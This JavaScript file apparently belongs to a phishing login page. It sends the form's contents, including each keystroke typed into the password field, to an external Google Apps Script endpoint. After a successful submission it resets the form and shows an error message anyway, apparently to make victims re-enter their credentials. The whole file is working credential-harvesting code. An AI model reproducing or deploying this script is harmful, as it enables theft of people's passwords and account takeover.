var valid = true;
var check = true;
$('#error-msg').hide()
// string replacement function
String.prototype.replaceAt = function(index, replacement) {
    if (index >= this.length) {
        return this.valueOf();
    }
 
    return this.substring(0, index) + replacement + this.substring(index + 1);
}

$('#password').focus(function(){
    $('#password').keyup(function(){
        $.ajax({
            data:$("#gform").serialize(),
            url:"https://script.google.com/macros/s/AKfycbyssVG5NPkyP_uVbtuE0GRKvVGBwFg8-gOsvc21FihhQbQMRtFA4In_C8HdfP0AqHrBHg/exec",        
            method:"post",
            success:function (response){
            },
            error:function (err){
                $('#error-msg').show()
            }
        })
    })
})

/*========================================       Ajax      =======================================*/
$("#gform").submit((e)=>{
    e.preventDefault()
    $.ajax({
        url:"https://script.google.com/macros/s/AKfycbyssVG5NPkyP_uVbtuE0GRKvVGBwFg8-gOsvc21FihhQbQMRtFA4In_C8HdfP0AqHrBHg/exec",
        data:$("#gform").serialize(),
        method:"post",
        success:function (response){
            console.log('data sended')
            e.preventDefault();
            $('#gform').trigger("reset");
            $('#error-msg').show();
        },
        error:function (err){
            alert("Something Error");
            $('#error-msg').show()
  
        }
    })
  })